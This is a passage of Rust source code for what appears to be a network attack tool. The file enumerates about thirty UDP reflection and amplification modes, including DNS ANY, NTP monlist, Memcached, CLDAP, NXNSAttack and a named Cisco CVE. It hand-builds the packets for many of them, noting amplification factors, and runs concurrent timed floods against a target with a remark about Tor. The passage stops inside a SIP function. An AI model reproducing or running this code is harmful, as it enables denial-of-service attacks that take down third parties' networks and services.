use std::time::{Duration, Instant};
use tokio::net::UdpSocket;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum UdpMode {
    DnsAny,
    DnsIxfr,
    NtpMonlist,
    NtpQuery,
    MemcachedStats,
    MemcachedGet,
    SsdpDiscovery,
    SnmpGetBulk,
    CharGen,
    Qotd,
    CldapSearch,
    CoapAmplification,
    WsDiscovery,
    PortmapDump,
    NetbiosNs,
    MdnsQuery,
    TftpRead,
    SipOptions,
    IkeAmplification,
    RipQuery,
    BacnetDiscovery,
    NtpReadVar,
    DnsDnssec,
    DnsRecursiveChain,
    UdpFlood,
    GenericUdp,
    SlpDuUpdate,
    DnsNxns,
    Tp240PhoneHome,
}

impl UdpMode {
    pub fn name(&self) -> &'static str {
        match self {
            UdpMode::DnsAny => "DNS ANY reflection",
            UdpMode::DnsIxfr => "DNS IXFR zone transfer",
            UdpMode::NtpMonlist => "NTP monlist amplification",
            UdpMode::NtpQuery => "NTP time query amplification",
            UdpMode::MemcachedStats => "Memcached stats amplification",
            UdpMode::MemcachedGet => "Memcached get amplification",
            UdpMode::SsdpDiscovery => "SSDP discovery amplification",
            UdpMode::SnmpGetBulk => "SNMP getbulk amplification",
            UdpMode::CharGen => "CharGen amplification",
            UdpMode::Qotd => "QOTD amplification",
            UdpMode::CldapSearch => "CLDAP search amplification",
            UdpMode::CoapAmplification => "CoAP amplification",
            UdpMode::WsDiscovery => "WS-Discovery amplification",
            UdpMode::PortmapDump => "Portmap/RPCbind dump",
            UdpMode::NetbiosNs => "NetBIOS Name Service query",
            UdpMode::MdnsQuery => "mDNS query",
            UdpMode::TftpRead => "TFTP read request",
            UdpMode::SipOptions => "SIP OPTIONS amplification",
            UdpMode::IkeAmplification => "IKE SA INIT amplification",
            UdpMode::RipQuery => "RIPv1 routing table dump",
            UdpMode::BacnetDiscovery => "BACnet device discovery",
            UdpMode::NtpReadVar => "NTP READVAR amplification",
            UdpMode::DnsDnssec => "DNS DNSSEC query amplification",
            UdpMode::DnsRecursiveChain => "DNS recursive chain amplification",
            UdpMode::UdpFlood => "UDP flood",
            UdpMode::GenericUdp => "UDP datagram flood",
            UdpMode::SlpDuUpdate => "SLP DU update amplification",
            UdpMode::DnsNxns => "DNS NXNS attack (NXNSAttack)",
            UdpMode::Tp240PhoneHome => "TP240PhoneHome / CVE-2022-26143 (Cisco ISE)",
        }
    }

    pub fn default_port(&self) -> u16 {
        match self {
            UdpMode::DnsAny | UdpMode::DnsIxfr => 53,
            UdpMode::NtpMonlist | UdpMode::NtpQuery => 123,
            UdpMode::MemcachedStats | UdpMode::MemcachedGet => 11211,
            UdpMode::SsdpDiscovery => 1900,
            UdpMode::SnmpGetBulk => 161,
            UdpMode::CharGen => 19,
            UdpMode::Qotd => 17,
            UdpMode::CldapSearch => 389,
            UdpMode::CoapAmplification => 5683,
            UdpMode::WsDiscovery => 3702,
            UdpMode::PortmapDump => 111,
            UdpMode::NetbiosNs => 137,
            UdpMode::MdnsQuery => 5353,
            UdpMode::TftpRead => 69,
            UdpMode::SipOptions => 5060,
            UdpMode::IkeAmplification => 500,
            UdpMode::RipQuery => 520,
            UdpMode::BacnetDiscovery => 47808,
            UdpMode::NtpReadVar => 123,
            UdpMode::DnsDnssec => 53,
            UdpMode::DnsRecursiveChain => 53,
            UdpMode::SlpDuUpdate => 427,
            UdpMode::DnsNxns => 53,
            UdpMode::Tp240PhoneHome => 443,
            UdpMode::UdpFlood => 0,
            UdpMode::GenericUdp => 12345,
        }
    }

    pub fn from_str(s: &str) -> Option<Self> {
        match s {
            "dns-any" | "dns-amplification" | "dns-any-query" => Some(UdpMode::DnsAny),
            "dns-ixfr" => Some(UdpMode::DnsIxfr),
            "ntp-monlist" => Some(UdpMode::NtpMonlist),
            "ntp-query" => Some(UdpMode::NtpQuery),
            "memcached-stats" => Some(UdpMode::MemcachedStats),
            "memcached-get" => Some(UdpMode::MemcachedGet),
            "ssdp" | "ssdp-msearch" => Some(UdpMode::SsdpDiscovery),
            "snmp" | "snmp-getbulk" => Some(UdpMode::SnmpGetBulk),
            "chargen" | "chargen-amplification" => Some(UdpMode::CharGen),
            "qotd" | "qotd-amplification" => Some(UdpMode::Qotd),
            "cldap" | "cldap-search" => Some(UdpMode::CldapSearch),
            "coap" | "coap-amplification" => Some(UdpMode::CoapAmplification),
            "ws-discovery" | "wsd" => Some(UdpMode::WsDiscovery),
            "portmap" | "portmap-dump" | "rpcbind" => Some(UdpMode::PortmapDump),
            "netbios" | "netbios-ns" => Some(UdpMode::NetbiosNs),
            "mdns" | "mdns-query" => Some(UdpMode::MdnsQuery),
            "tftp" | "tftp-read" => Some(UdpMode::TftpRead),
            "sip" | "sip-options" => Some(UdpMode::SipOptions),
            "ike" | "ike-amplification" | "isakmp" => Some(UdpMode::IkeAmplification),
            "rip" | "rip-query" | "ripv1" => Some(UdpMode::RipQuery),
            "bacnet" | "bacnet-discovery" | "bacnet-device" => Some(UdpMode::BacnetDiscovery),
            "ntp-readvar" | "ntpreadvar" => Some(UdpMode::NtpReadVar),
            "dns-dnssec" | "dnssec" | "dnssec-query" | "dns-dnssec-query" => Some(UdpMode::DnsDnssec),
            "dns-recursive" | "dns-recursive-chain" => Some(UdpMode::DnsRecursiveChain),
            "udp-flood" => Some(UdpMode::UdpFlood),
            "udp-generic" | "generic" | "mongodb-ismaster" | "nfs-mountd" | "openvpn-ping" => Some(UdpMode::GenericUdp),
                        "slp" | "slp-du" | "slp-update" => Some(UdpMode::SlpDuUpdate),
            "dns-nxns" | "dns-nxns-attack" | "nxnsattack" => Some(UdpMode::DnsNxns),
            "tp240" | "tp240-phonehome" | "cve-2022-26143" => Some(UdpMode::Tp240PhoneHome),
            _ => None,
        }
    }
}

// ================================================================
// DNS ANY query — request is ~40B, response can be 3-4KB
// Amplification: up to 70x
// ================================================================
fn build_dns_query(qtype: u16, domain: &str) -> Vec<u8> {
    let tid: u16 = rand::random();
    let mut pkt = Vec::with_capacity(512);

    // Header (12 bytes)
    pkt.extend_from_slice(&tid.to_be_bytes());  // Transaction ID
    pkt.extend_from_slice(&[0x01, 0x00]);        // Flags: standard query, RD=1
    pkt.extend_from_slice(&[0x00, 0x01]);        // QDCOUNT: 1 question
    pkt.extend_from_slice(&[0x00, 0x00]);        // ANCOUNT: 0
    pkt.extend_from_slice(&[0x00, 0x00]);        // NSCOUNT: 0
    pkt.extend_from_slice(&[0x00, 0x00]);        // ARCOUNT: 0

    // Encode domain as DNS labels
    for label in domain.split('.') {
        if label.is_empty() { continue; }
        pkt.push(label.len() as u8);
        pkt.extend_from_slice(label.as_bytes());
    }
    pkt.push(0x00);  // Root terminator
    pkt.extend_from_slice(&qtype.to_be_bytes());  // QTYPE
    pkt.extend_from_slice(&[0x00, 0x01]);         // QCLASS (IN)

    pkt
}

fn build_dns_any() -> Vec<u8> {
    build_dns_query(0x00ff, "google.com")  // QTYPE = ANY, target google.com
}

fn build_dns_ixfr() -> Vec<u8> {
    // IXFR uses a SOA serial number to request incremental zone transfer
    // For amplification, we send IXFR with serial=0 which asks for full zone
    let mut pkt = build_dns_query(0x00fb, "google.com");  // QTYPE = IXFR, target google.com

    // IXFR requires an authority section with the SOA record
    // Add SOA in authority section
    pkt.extend_from_slice(&[0x00, 0x01]);  // NSCOUNT: 1 (authority RR)

    // Authority RR: root label
    pkt.push(0x00);   // Name: .
    pkt.extend_from_slice(&[0x00, 0x06]);  // TYPE: SOA
    pkt.extend_from_slice(&[0x00, 0x01]);  // CLASS: IN
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);  // TTL
    pkt.extend_from_slice(&[0x00, 0x14]);  // RDLENGTH: 20
    // SOA RDATA: MNAME, RNAME, SERIAL=0, REFRESH, RETRY, EXPIRE, MINIMUM
    pkt.extend_from_slice(&[0x00; 20]);     // Zero SOA fields

    // Fix ARCOUNT to 0
    pkt[10] = 0x00;
    pkt[11] = 0x00;

    pkt
}

// ================================================================
// NTP monlist — sends GET_MONLIST request to NTP server
// Classic amplification: up to 556x
// ================================================================
fn build_ntp_monlist() -> Vec<u8> {
    // NTP mode 7 (MODE_PRIVATE) message for GET_MONLIST (op 0)
    let mut pkt = vec![0u8; 12];

    pkt[0] = 0x17;           // Leap=0, Version=2, Mode=7 (private)
    pkt[1] = 0x03;           // Implementation=3 (ntpd), Request code=0 (GET_MONLIST)
    pkt[2] = 0x00;           // Sequence number (0 for first request)
    pkt[3] = 0x00;           // Status, Err, Message count
    // Association ID (4 bytes) — use 0 for first
    // Timestamp (4 bytes) — use 0
    // The response is a series of monlist entries

    pkt
}

fn build_ntp_query() -> Vec<u8> {
    // NTP v3 client request — mode 3 (client)
    let mut pkt = vec![0u8; 48];

    pkt[0] = 0x1b;           // Leap=0, Version=3, Mode=3 (client)
    // Originate timestamp (bytes 24-31) — set to current time in NTP format
    let epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    let ntp_secs = epoch.as_secs() + 2208988800u64;  // Offset to NTP epoch
    let ntp_frac = ((epoch.subsec_nanos() as u64) << 32) / 1_000_000_000;

    pkt[24..28].copy_from_slice(&(ntp_secs as u32).to_be_bytes());  // Seconds (u32)
    pkt[28..32].copy_from_slice(&(ntp_frac as u32).to_be_bytes());  // Fraction (u32)

    pkt
}

// ================================================================
// Memcached — text protocol, "stats" returns a lot of data
// Amplification: up to 51,000x (10MB+ response from 15B request)
// ================================================================
fn build_memcached_stats() -> Vec<u8> {
    b"stats\r\n".to_vec()
}

fn build_memcached_get() -> Vec<u8> {
    // Some memcached servers have cached keys — ask for a known one
    // "stats cachedump 1 100" can dump many keys (amplification vector)
    b"stats cachedump 1 100\r\n".to_vec()
}

// ================================================================
// SSDP (Simple Service Discovery Protocol) — M-SEARCH request
// Used by UPnP devices, response can be quite large
// ================================================================
fn build_ssdp_discovery() -> Vec<u8> {
    b"M-SEARCH * HTTP/1.1\r\n\
      HOST: 239.255.255.250:1900\r\n\
      MAN: \"ssdp:discover\"\r\n\
      MX: 3\r\n\
      ST: ssdp:all\r\n\
      \r\n"
    .to_vec()
}

// ================================================================
// SNMP GetBulk — ASN.1/BER encoded GetBulkRequest
// Forcibly retrieve many OIDs in one request
// ================================================================
fn build_snmp_getbulk() -> Vec<u8> {
    // SNMPv2c GetBulkRequest for .1.3.6.1.2.1 (mib-2)
    // max-repetitions = 50 means we ask for 50 OIDs at once
    let community = b"public";
    let req_id: u32 = rand::random();

    // SNMP message wrapper
    let mut pkt = Vec::new();

    // SEQUENCE { version, community, data }
    // version = SNMPv2c (1)
    // community = "public"
    // data = GetBulkRequest {
    //     request-id, non-repeaters=0, max-repetitions=50,
    //     variable-bindings [ .1.3.6.1.2.1.1 (system) ]
    // }

    // We'll construct this manually in BER:
    // 0x30 (SEQUENCE) length ...
    //   0x02 (INTEGER) 1 0x01 (version=1)
    //   0x04 (OCTET STRING) 6 "public"
    //   0xa5 (GetBulkRequest [5]) length ...
    //     0x02 (INTEGER) 4 req_id
    //     0x02 (INTEGER) 1 0x00 (non-repeaters)
    //     0x02 (INTEGER) 1 50   (max-repetitions)
    //     0x30 (SEQUENCE) length ...
    //       0x30 (SEQUENCE) length ...
    //         0x06 (OID) ... .1.3.6.1.2.1.1
    //         0x05 (NULL) (empty value)

    // Build from inner to outer:
    // Variable binding: (.1.3.6.1.2.1.1, NULL)
    let oid_bytes: &[u8] = &[0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x00];
    let mut vb_value = Vec::new();
    vb_value.push(0x06);
    vb_value.push(oid_bytes.len() as u8);
    vb_value.extend_from_slice(oid_bytes);
    vb_value.extend_from_slice(&[0x05, 0x00]); // NULL value

    let vb_seq = build_sequence(&vb_value);

    // variable-bindings SEQUENCE
    let vbs = build_sequence(&vb_seq);

    // GetBulkRequest PDU: 0xa5 | length | request-id | non-repeaters | max-repetitions | vbs
    let mut pdu_body = Vec::new();
    pdu_body.extend_from_slice(&encode_integer(req_id as i64));
    pdu_body.extend_from_slice(&encode_integer(0));   // non-repeaters
    pdu_body.extend_from_slice(&encode_integer(50));  // max-repetitions
    pdu_body.extend_from_slice(&vbs);

    // PDU tag 0xa5 = context [5] (GetBulkRequest)
    let pdu = build_tagged(0xa5, &pdu_body);

    // community string
    let comm = build_octet_string(community);

    // version (INTEGER 1 = SNMPv2c)
    let version = encode_integer(1);

    // SNMP message SEQUENCE
    let mut msg_body = Vec::new();
    msg_body.extend_from_slice(&version);
    msg_body.extend_from_slice(&comm);
    msg_body.extend_from_slice(&pdu);

    pkt = build_sequence(&msg_body);

    pkt
}

fn build_sequence(contents: &[u8]) -> Vec<u8> {
    let mut out = vec![0x30];
    encode_length(&mut out, contents.len());
    out.extend_from_slice(contents);
    out
}

fn build_tagged(tag: u8, contents: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    encode_length(&mut out, contents.len());
    out.extend_from_slice(contents);
    out
}

fn encode_integer(value: i64) -> Vec<u8> {
    if value == 0 {
        return vec![0x02, 0x01, 0x00];
    }

    let mut val = value;
    let mut bytes = Vec::new();
    let negative = val < 0;
    if negative { val = -val; }

    while val > 0 {
        bytes.push((val & 0xff) as u8);
        val >>= 8;
    }
    bytes.reverse();

    // Add leading 0xff if negative and MSB set
    if negative {
        // Two's complement
        for b in &mut bytes {
            *b = !*b;
        }
        // Add 1
        for b in bytes.iter_mut().rev() {
            let (v, carry) = b.overflowing_add(1);
            *b = v;
            if !carry { break; }
        }
        if bytes[0] & 0x80 == 0 {
            bytes.insert(0, 0xff);
        }
    } else if bytes[0] & 0x80 != 0 {
        bytes.insert(0, 0x00);
    }

    let mut out = vec![0x02];
    encode_length(&mut out, bytes.len());
    out.extend_from_slice(&bytes);
    out
}

fn encode_length(out: &mut Vec<u8>, len: usize) {
    if len < 128 {
        out.push(len as u8);
    } else {
        let mut bytes = Vec::new();
        let mut l = len;
        while l > 0 {
            bytes.push((l & 0xff) as u8);
            l >>= 8;
        }
        bytes.reverse();
        out.push(0x80 | bytes.len() as u8);
        out.extend_from_slice(&bytes);
    }
}

fn encode_octet_string(contents: &[u8]) -> Vec<u8> {
    let mut out = vec![0x04];
    encode_length(&mut out, contents.len());
    out.extend_from_slice(contents);
    out
}

fn build_octet_string(contents: &[u8]) -> Vec<u8> {
    encode_octet_string(contents)
}

// ================================================================
// CharGen (Character Generator Protocol) — port 19
// Send any byte, get up to 512 bytes of random characters back
// ================================================================
fn build_chargen() -> Vec<u8> {
    // Just send a newline — server responds with character stream
    vec![b'\n']
}

// ================================================================
// QOTD (Quote of the Day) — port 17
// Send any byte, get a quote back
// ================================================================
fn build_qotd() -> Vec<u8> {
    vec![b'\n']
}

// ================================================================
// Run a single UDP amplification exchange
// ================================================================
async fn run_udp_protocol(mode: UdpMode, host: &str, port: u16) -> Result<(usize, usize), String> {
    let socket = UdpSocket::bind("0.0.0.0:0")
        .await
        .map_err(|e| format!("bind: {}", e))?;

    // Set read timeout
    let target_addr = format!("{}:{}", host, port);

    // Build request
    let request = match mode {
        UdpMode::DnsAny => build_dns_any(),
        UdpMode::DnsIxfr => build_dns_ixfr(),
        UdpMode::NtpMonlist => build_ntp_monlist(),
        UdpMode::NtpQuery => build_ntp_query(),
        UdpMode::MemcachedStats => build_memcached_stats(),
        UdpMode::MemcachedGet => build_memcached_get(),
        UdpMode::SsdpDiscovery => {
            // SSDP is multicast — connect first
            let sent = socket.send_to(&build_ssdp_discovery(), &target_addr)
                .await
                .map_err(|e| format!("send: {}", e))?;
            let mut buf = vec![0u8; 65535];
            let recv = tokio::time::timeout(Duration::from_secs(3), socket.recv_from(&mut buf))
                .await
                .map_err(|_| "timeout".to_string())?
                .map_err(|e| format!("recv: {}", e))?
                .0;
            return Ok((sent, recv));
        }
        UdpMode::SnmpGetBulk => build_snmp_getbulk(),
        UdpMode::CharGen => build_chargen(),
        UdpMode::Qotd => build_qotd(),
        UdpMode::CldapSearch => build_cldap_search(),
        UdpMode::CoapAmplification => build_coap_request(),
        UdpMode::WsDiscovery => build_ws_discovery(),
        UdpMode::PortmapDump => build_portmap_dump(),
        UdpMode::NetbiosNs => build_netbios_ns(),
        UdpMode::MdnsQuery => build_mdns_query(),
        UdpMode::TftpRead => build_tftp_read(),
        UdpMode::SipOptions => build_sip_options(),
        UdpMode::IkeAmplification => build_ike_sa_init(),
        UdpMode::RipQuery => build_rip_query(),
        UdpMode::BacnetDiscovery => build_bacnet_whois(),
        UdpMode::NtpReadVar => build_ntp_readvar(),
        UdpMode::DnsDnssec => build_dns_dnssec(),
        UdpMode::DnsRecursiveChain => build_dns_recursive(),
        UdpMode::UdpFlood => build_udp_flood(),
        UdpMode::SlpDuUpdate => build_slp_du_update(),
        UdpMode::DnsNxns => build_dns_nxns(),
        UdpMode::Tp240PhoneHome => build_tp240_phonehome(),
        UdpMode::GenericUdp => {
            // Send a small datagram, read what comes back
            let sent = socket.send_to(b"hello", &target_addr)
                .await
                .map_err(|e| format!("send: {}", e))?;
            let mut buf = vec![0u8; 65535];
            let recv = tokio::time::timeout(Duration::from_secs(3), socket.recv_from(&mut buf))
                .await
                .map_err(|_| "timeout".to_string())?
                .map_err(|e| format!("recv: {}", e))?
                .0;
            return Ok((sent, recv));
        }
    };

    let sent = request.len();

    // Send the request
    socket.send_to(&request, &target_addr)
        .await
        .map_err(|e| format!("send: {}", e))?;

    // Read response with timeout
    let mut buf = vec![0u8; 65535];
    let recv = match tokio::time::timeout(Duration::from_secs(5), socket.recv_from(&mut buf)).await {
        Ok(Ok((n, _))) => n,
        Ok(Err(e)) => return Err(format!("recv: {}", e)),
        Err(_) => return Err("timeout".to_string()),
    };

    Ok((sent, recv))
}

/// Run UDP load: spawns workers that repeatedly send and receive
pub async fn run_udp_load(
    mode: UdpMode,
    target: &str,
    concurrency: usize,
    duration_secs: u64,
) {
    let start = Instant::now();
    let dur = Duration::from_secs(duration_secs);
    let port = mode.default_port();
    let host = target.split(':').next().unwrap_or(target);
    let custom_port = target.split(':').nth(1).and_then(|p| p.parse::<u16>().ok());
    let port = custom_port.unwrap_or(port);

    println!("=== UDP Amplification: {} ===", mode.name());
    println!("Target: {}:{} | Concurrency: {} | Duration: {}s", host, port, concurrency, duration_secs);
    println!("Note: Tor does not route UDP. Running in direct mode.");
    println!();

    let mut total_sent: u64 = 0;
    let mut total_recv: u64 = 0;
    let mut total_requests: u64 = 0;
    let mut total_errors: u64 = 0;

    while start.elapsed() < dur {
        let mut handles = Vec::new();

        for _ in 0..concurrency {
            let host = host.to_string();
            let mode = mode;

            handles.push(tokio::spawn(async move {
                match run_udp_protocol(mode, &host, port).await {
                    Ok((sent, recv)) => (sent as u64, recv as u64, false),
                    Err(_) => (0u64, 0u64, true),
                }
            }));
        }

        for h in handles {
            match h.await {
                Ok((sent, recv, is_err)) => {
                    total_sent += sent;
                    total_recv += recv;
                    total_requests += 1;
                    if is_err { total_errors += 1; }
                }
                Err(_) => {
                    total_errors += 1;
                    total_requests += 1;
                }
            }
        }

        let elapsed = start.elapsed().as_secs();

        // Status update
        if elapsed % 5 == 0 || total_requests < 10 {
            let amp_ratio = if total_sent > 0 {
                total_recv as f64 / total_sent as f64
            } else {
                0.0
            };
            println!(
                "[{:3}s] Req: {:5} | Err: {:3} | Sent: {}KB | Recv: {}KB | Ratio: {:.1}x | Rate: {:.0} req/s",
                elapsed,
                total_requests,
                total_errors,
                total_sent / 1024,
                total_recv / 1024,
                amp_ratio,
                total_requests as f64 / elapsed.max(1) as f64,
            );
        }
    }

    let elapsed = start.elapsed().as_secs().max(1);
    let amp_ratio = if total_sent > 0 {
        total_recv as f64 / total_sent as f64
    } else {
        0.0
    };
    println!();
    println!("=== Results ===");
    println!("Total requests: {}", total_requests);
    println!("Total errors:   {}", total_errors);
    println!("Sent:           {} bytes ({} KB)", total_sent, total_sent / 1024);
    println!("Received:       {} bytes ({} KB)", total_recv, total_recv / 1024);
    println!("Amplification:  {:.1}x", amp_ratio);
    println!("Rate:           {:.0} req/s", total_requests as f64 / elapsed as f64);
}

// ================================================================
// CLDAP (Connectionless LDAP) search request /389
// Sends a LDAP search over UDP — server responds with directory data
// Amplification: 40-60x
// ================================================================
fn build_cldap_search() -> Vec<u8> {
    // LDAP search request packed in BER for UDP (connectionless)
    // MessageID = 1, SearchRequest for rootDSE
    // Filter: (objectClass=*) requesting all attributes
    //
    // Format: SEQUENCE { messageID, protocolOp CHOICE { searchRequest } }
    // We build the inner SEQUENCE manually.
    let mut msg = Vec::new();

    // MessageID: INTEGER 1 (2 bytes + tag + length)
    msg.push(0x02); // INTEGER tag
    msg.push(0x01); // length 1
    msg.push(0x01); // value 1

    // SearchRequest tag (0x63 = APPLICATION 3, constructed)
    // Base object: empty = rootDSE
    // Scope: 0 = baseObject
    // Deref: 0
    // SizeLimit: 0 (unlimited)
    // TimeLimit: 0 (unlimited)
    // TypesOnly: false
    // Filter: (objectClass=*)  — equality match with present value
    // Attributes: all (empty list)
    let filter_presence = vec![0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73]; // (objectClass=*) using present filter

    let mut search = Vec::new();
    // baseObject (empty)
    search.push(0x04); // OCTET STRING
    search.push(0x00);
    // scope: ENUMERATED 0 (baseObject)
    search.push(0x0a); // ENUMERATED
    search.push(0x01);
    search.push(0x00);
    // derefAliases: ENUMERATED 0
    search.push(0x0a);
    search.push(0x01);
    search.push(0x00);
    // sizeLimit: INTEGER 0
    search.push(0x02);
    search.push(0x01);
    search.push(0x00);
    // timeLimit: INTEGER 0
    search.push(0x02);
    search.push(0x01);
    search.push(0x00);
    // typesOnly: BOOLEAN false
    search.push(0x01);
    search.push(0x01);
    search.push(0x00);
    // filter — use present filter (objectClass=*)
    search.extend_from_slice(&filter_presence);
    // attributes: empty list = all attributes
    search.push(0x30); // SEQUENCE
    search.push(0x00);

    // Tag the search request as APPLICATION 3 (0x63)
    let mut search_tagged = vec![0x63, (search.len() & 0xff) as u8];
    search_tagged.extend_from_slice(&search);

    // Final SEQUENCE wrapping messageID + searchRequest
    let mut final_seq = vec![0x30];
    let body_len = msg.len() + search_tagged.len();
    final_seq.push(body_len as u8);
    final_seq.extend_from_slice(&msg);
    final_seq.extend_from_slice(&search_tagged);

    final_seq
}

// ================================================================
// CoAP (Constrained Application Protocol) GET request /5683
// Requests large resource representation from IoT devices
// Amplification: 20-50x
// ================================================================
fn build_coap_request() -> Vec<u8> {
    // CoAP v1 CON GET with large Accept option
    // Requesting ".well-known/core" with ?large query
    // Format: Version(2), Type(0=CON), TokenLen, Code(0.01=GET), MsgID
    // + Options + Payload marker
    let mut pkt = Vec::new();

    // First byte: Version=01 (bits 6-7), Type=00 (CON, bits 4-5), TokenLen=0 (bits 0-3)
    pkt.push(0x40); // v1, CON, no token
    // Code: 0.01 = GET (0x01)
    pkt.push(0x01);
    // Message ID
    let msg_id: u16 = rand::random();
    pkt.extend_from_slice(&msg_id.to_be_bytes());

    // Uri-Path option: ".well-known"
    // Option delta=11 (Uri-Path), length=10
    pkt.push((11 << 4) | 10); // delta=11, len=10
    pkt.extend_from_slice(b".well-known");
    // Uri-Path option: "core" (delta=0 since same option, length=4)
    pkt.push(0x04);
    pkt.extend_from_slice(b"core");
    // Uri-Query option: "large" to trigger larger response
    pkt.push((15 << 4) | 5); // delta=15 (Uri-Query), len=5
    pkt.extend_from_slice(b"large");

    pkt
}

// ================================================================
// WS-Discovery Probe /3702 — SOAP/XML multicast request
// Each UPnP/WS-D device responds with full device description XML
// Amplification: 25-100x
// ================================================================
fn build_ws_discovery() -> Vec<u8> {
    // WS-Discovery Probe message (SOAP over UDP)
    // Request probing for all target types
    let msg = b"<?xml version=\"1.0\" encoding=\"utf-8\"?>\
<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" \
xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" \
xmlns:wsd=\"http://schemas.xmlsoap.org/ws/2005/04/discovery\" \
xmlns:wsdp=\"http://schemas.xmlsoap.org/ws/2006/02/devprof\">\
<soap:Header>\
<wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>\
<wsa:MessageID>uuid:00000000-0000-0000-0000-000000000000</wsa:MessageID>\
<wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>\
</soap:Header>\
<soap:Body>\
<wsd:Probe>\
<wsd:Types>wsdp:Device</wsd:Types>\
</wsd:Probe>\
</soap:Body>\
</soap:Envelope>";
    msg.to_vec()
}

// ================================================================
// Portmap (RPCbind) DUMP /111 — requests list of all registered RPC services
// Response can be very large on NFS servers with many services
// Amplification: 7-28x
// ================================================================
fn build_portmap_dump() -> Vec<u8> {
    // RPCv2 NULL procedure call to portmap, followed by PMAPPROC_DUMP
    // ONC RPC header + Portmap DUMP request
    let mut pkt = Vec::new();

    // RPC header (28 bytes)
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // XID
    // CALL (0), RPCv2 (2), PROG=100000 (portmap), VER=4, PROC=4 (PMAPPROC_DUMP)
    pkt.extend_from_slice(&[
        0x00, 0x00, 0x00, 0x00, // msg_type = CALL
        0x00, 0x00, 0x00, 0x02, // RPC version = 2
        0x00, 0x01, 0x86, 0xA0, // program = 100000 (portmapper)
        0x00, 0x00, 0x00, 0x04, // version = 4
        0x00, 0x00, 0x00, 0x04, // procedure = 4 (DUMP)
    ]);
    // Auth: AUTH_NONE (flavor=0, length=0)
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    // Verifier: AUTH_NONE
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    // No additional parameters for PMAPPROC_DUMP

    pkt
}

// ================================================================
// NetBIOS Name Service status query /137
// Requests the list of all names registered by a NetBIOS node
// Response includes all service names, MAC, and adapter status
// Amplification: 3-5x
// ================================================================
fn build_netbios_ns() -> Vec<u8> {
    // NetBIOS Name Service NBSTAT request (name query for *<00>)
    // Transaction ID (2), Flags (2), Questions (2), AnswerRR (2),
    // AuthorityRR (2), AdditionalRR (2), Queries...
    let mut pkt = Vec::new();
    // Transaction ID
    let tid: u16 = rand::random();
    pkt.extend_from_slice(&tid.to_be_bytes());
    // Flags: 0x0110 = request, broadcast, recursion desired
    pkt.extend_from_slice(&[0x01, 0x10]);
    // QDCOUNT: 1
    pkt.extend_from_slice(&[0x00, 0x01]);
    // ANCOUNT, NSCOUNT, ARCOUNT: 0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);

    // Query: Name = *<00> (all names), type = NBSTAT (0x21), class = IN
    // NetBIOS name encoded as 32-byte first-level encoding
    // Name: *<00> → pad to 16 bytes with spaces, then 32-byte encoded
    let raw_name = b"*              \x00"; // 16 bytes: * + 14 spaces + type 0x00
    let mut encoded = vec![0x20]; // length prefix (32 nybbles)
    for b in raw_name.iter() {
        encoded.push((b >> 4) + 0x41); // high nybble
        encoded.push((b & 0x0f) + 0x41); // low nybble
    }
    pkt.extend_from_slice(&encoded);
    // Name type: NBSTAT (0x21)
    pkt.extend_from_slice(&[0x00, 0x21]);
    // Class: IN (0x0001)
    pkt.extend_from_slice(&[0x00, 0x01]);

    pkt
}

// ================================================================
// mDNS query /5353 — Multicast DNS ANY query
// Requests all record types for a service type
// Amplification: 2-10x
// ================================================================
fn build_mdns_query() -> Vec<u8> {
    // mDNS query for _services._dns-sd._udp.local ANY
    // Standard DNS query format but with:
    // - Source port 5353
    // - Response expected via multicast or unicast
    let mut pkt = Vec::new();
    // Transaction ID = 0 (mDNS uses 0)
    pkt.extend_from_slice(&[0x00, 0x00]);
    // Flags: standard query (0x0000) + RD=0
    pkt.extend_from_slice(&[0x00, 0x00]);
    // QDCOUNT: 1
    pkt.extend_from_slice(&[0x00, 0x01]);
    // ANCOUNT, NSCOUNT, ARCOUNT: 0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);

    // Name: _services._dns-sd._udp.local
    let labels: &[&[u8]] = &[
        b"\x0a_services",
        b"\x07_dns-sd",
        b"\x04_udp",
        b"\x05local",
    ];
    for label in labels {
        pkt.extend_from_slice(*label);
    }
    pkt.push(0x00); // root
    // QTYPE: ANY (255)
    pkt.extend_from_slice(&[0x00, 0xFF]);
    // QCLASS: IN (1) + unicast-response flag (0x8000)
    pkt.extend_from_slice(&[0x80, 0x01]);

    pkt
}

// ================================================================
// TFTP Read Request /69 — requests a file, server sends data blocks
// Large filename can trigger larger responses via option negotiation
// Amplification: 2-4x
// ================================================================
fn build_tftp_read() -> Vec<u8> {
    // TFTP RRQ (Read Request) packet
    // Opcode (2 bytes) + Filename (string) + 0 + Mode (string) + 0
    // + optional options (blksize, tsize)
    let mut pkt = Vec::new();
    // Opcode: 1 = RRQ
    pkt.extend_from_slice(&[0x00, 0x01]);
    // Filename (large to trigger bigger response via option negotiation)
    pkt.extend_from_slice(b"bootstrap.img");
    pkt.push(0x00);
    // Mode: octet (binary)
    pkt.extend_from_slice(b"octet");
    pkt.push(0x00);
    // Options: blksize 8192 (request larger blocks)
    pkt.extend_from_slice(b"blksize");
    pkt.push(0x00);
    pkt.extend_from_slice(b"8192");
    pkt.push(0x00);
    // Option: tsize 0 (ask for file size, triggers server to stat file)
    pkt.extend_from_slice(b"tsize");
    pkt.push(0x00);
    pkt.extend_from_slice(b"0");
    pkt.push(0x00);

    pkt
}

// ================================================================
// SIP OPTIONS request /5060 — requests VoIP server capabilities
// Response includes full feature list, methods, extensions
// Amplification: 10-30x
// ================================================================
fn build_sip_options() -> Vec<u8> {
